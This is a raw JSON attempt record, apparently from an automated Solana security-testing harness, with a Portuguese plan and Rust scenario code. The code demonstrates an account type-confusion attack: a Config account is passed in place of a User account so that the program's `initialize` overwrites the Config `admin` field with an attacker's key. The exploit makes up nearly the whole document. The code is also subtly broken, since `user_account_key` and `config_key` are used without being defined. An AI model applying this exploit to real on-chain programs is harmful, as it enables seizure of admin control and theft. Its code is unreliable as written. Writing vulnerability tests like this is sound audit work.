attempts.raw:
{
  "plan": "O programa native `initialize` recebe duas contas: `user_info` (gravavel) e `authority_info` (signer). Ele desserializa `user_info` com `unpack_unchecked` sem discriminador e sobrescreve os primeiros 32 bytes com a chave de `authority_info`. O baseline usa uma conta `User` legitima de 32 bytes e uma authority valida, provando que o cenario esta montado. O ataque passa uma conta de outro tipo (uma conta de configuracao com 64 bytes, cujo primeiro campo e um `admin` diferente) como `user_info`, e uma authority atacante; se o programa aceitar, os primeiros 32 bytes da conta de configuracao serao sobrescritos pela chave do atacante, corrompendo o estado. O efeito mede que o campo `admin` da conta de configuracao apos o ataque e igual a chave do atacante, algo que o uso legitimo nao produziria.",
  "scenario": "let program_id = env.program_id;

// Conta de configuracao de outro tipo: 64 bytes, primeiro campo = admin (Pubkey), segundo = fee (u64)
let admin_legit = Pubkey::new_unique();
let config_data = anchor_account_data("Config", &(admin_legit, 123u64));
let config_account = account(&program_id, &config_data, None);

// Conta User legitima: 32 bytes (authority)
let user_authority = Pubkey::new_unique();
let user_data = user_authority.to_bytes().to_vec();
let user_account = account(&program_id, &user_data, None);

// Authority legitima (signer)
let authority_legit = Pubkey::new_unique();
let authority_legit_account = wallet(1_000_000_000);

// Instrucao Init {} (Borsh: enum unit variant = 1 byte 0)
let ix_data = vec![0u8];

// Baseline: user_info = conta User legitima, authority = authority_legit
let baseline_ix = env.raw_ix(
    &ix_data,
    &[
        AccountMeta::new(user_account_key, false),
        AccountMeta::new_readonly(authority_legit, true),
    ],
);
let baseline_accounts = vec![
    (user_account_key, user_account.clone()),
    (authority_legit, authority_legit_account.clone()),
];
let baseline_result = env.baseline(
    "initialize legitimo com conta User",
    &baseline_ix,
    &baseline_accounts,
);

// Ataque: user_info = conta Config (64 bytes, outro layout), authority = atacante
let attacker_authority = Pubkey::new_unique();
let attacker_authority_account = wallet(1_000_000_000);

let attack_ix = env.raw_ix(
    &ix_data,
    &[
        AccountMeta::new(config_key, false),
        AccountMeta::new_readonly(attacker_authority, true),
    ],
);
let attack_accounts = vec![
    (config_key, config_account.clone()),
    (attacker_authority, attacker_authority_account.clone()),
];
let attack_result = env.attack(
    "initialize com conta Config no lugar de User (COSPLAY)",
    &attack_ix,
    &attack_accounts,
);

if attack_result.program_result == ProgramResult::Success {
    let config_after = after(&attack_result, &config_key);
    let admin_after = read_pubkey(config_after.data(), 0);
    env.effect(
        "primeiros 32 bytes da conta Config sobrescritos com a chave do atacante",
        admin_after == attacker_authority,
    );
}
"
}

